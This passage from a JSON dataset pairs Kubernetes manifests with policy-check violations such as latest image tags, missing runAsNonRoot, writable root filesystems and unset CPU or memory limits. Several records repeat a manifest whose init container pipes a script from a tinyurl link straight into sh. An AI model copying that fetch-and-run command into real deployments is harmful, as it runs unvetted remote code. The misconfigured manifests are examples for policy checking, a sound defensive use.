envoy-yaml\n        configMap:\n          name: proxy-envoy-config\n      - name: elastic-certs-pub\n        secret:\n          secretName: pl-elastic-es-http-certs-public\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"api-server\" has memory limit 0"
  },
  {
    "id": "01173",
    "manifest_path": "data/manifests/the_stack_sample/sample_0312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:latest\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mull-frontend\" is using an invalid container image, \"ritchellegmp/mull-frontend:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01174",
    "manifest_path": "data/manifests/the_stack_sample/sample_0312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:latest\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mull-frontend\" does not have a read-only root file system"
  },
  {
    "id": "01175",
    "manifest_path": "data/manifests/the_stack_sample/sample_0312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:latest\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mull-frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "01176",
    "manifest_path": "data/manifests/the_stack_sample/sample_0312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:latest\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mull-frontend\" has cpu request 0"
  },
  {
    "id": "01177",
    "manifest_path": "data/manifests/the_stack_sample/sample_0312.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:latest\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mull-frontend\" has memory limit 0"
  },
  {
    "id": "01178",
    "manifest_path": "data/manifests/the_stack_sample/sample_0315.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:latest\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"replay\" is using an invalid container image, \"paralin/dota-replay:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01179",
    "manifest_path": "data/manifests/the_stack_sample/sample_0315.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:latest\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"replay\" does not have a read-only root file system"
  },
  {
    "id": "01180",
    "manifest_path": "data/manifests/the_stack_sample/sample_0315.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:latest\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"replay\" is not set to runAsNonRoot"
  },
  {
    "id": "01181",
    "manifest_path": "data/manifests/the_stack_sample/sample_0315.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:latest\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"replay\" has cpu request 0"
  },
  {
    "id": "01182",
    "manifest_path": "data/manifests/the_stack_sample/sample_0315.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:latest\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"replay\" has memory limit 0"
  },
  {
    "id": "01183",
    "manifest_path": "data/manifests/the_stack_sample/sample_0316.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:latest\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"service\" is using an invalid container image, \"tanelmae/private-dns:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01184",
    "manifest_path": "data/manifests/the_stack_sample/sample_0316.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:latest\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"service\" does not have a read-only root file system"
  },
  {
    "id": "01185",
    "manifest_path": "data/manifests/the_stack_sample/sample_0316.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:latest\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"service\" is not set to runAsNonRoot"
  },
  {
    "id": "01186",
    "manifest_path": "data/manifests/the_stack_sample/sample_0316.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:latest\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"service\" has cpu request 0"
  },
  {
    "id": "01187",
    "manifest_path": "data/manifests/the_stack_sample/sample_0316.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:latest\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"service\" has memory limit 0"
  },
  {
    "id": "01188",
    "manifest_path": "data/manifests/the_stack_sample/sample_0317.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"needs-rebase\" does not have a read-only root file system"
  },
  {
    "id": "01189",
    "manifest_path": "data/manifests/the_stack_sample/sample_0317.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"needs-rebase\" is not set to runAsNonRoot"
  },
  {
    "id": "01190",
    "manifest_path": "data/manifests/the_stack_sample/sample_0317.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"needs-rebase\" has cpu request 0"
  },
  {
    "id": "01191",
    "manifest_path": "data/manifests/the_stack_sample/sample_0317.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"needs-rebase\" has memory limit 0"
  },
  {
    "id": "01192",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "01193",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "01194",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "01195",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "01196",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "01197",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "01198",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "01199",
    "manifest_path": "data/manifests/the_stack_sample/sample_0318.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "01200",
    "manifest_path": "data/manifests/the_stack_sample/sample_0321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "01201",
    "manifest_path": "data/manifests/the_stack_sample/sample_0321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "01202",
    "manifest_path": "data/manifests/the_stack_sample/sample_0321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "01203",
    "manifest_path": "data/manifests/the_stack_sample/sample_0321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  labels:\n    app: postgres\n    group: db\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        type: db\n    spec:\n      volumes:\n      - name: postgres-storage\n        persistentVolumeClaim:\n          claimName: postgres-pvc\n      containers:\n      - name: postgres\n        image: postgres:9.6-alpine\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - name: postgres-storage\n          mountPath: /var/lib/postgresql/data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "01204",
    "manifest_path": "data/manifests/the_stack_sample/sample_0323.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "01205",
    "manifest_path": "data/manifests/the_stack_sample/sample_0323.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      name: nginx-pod\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx:stable\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "01206",
    "manifest_path": "data/manifests/the_stack_sample/sample_0323.yaml",
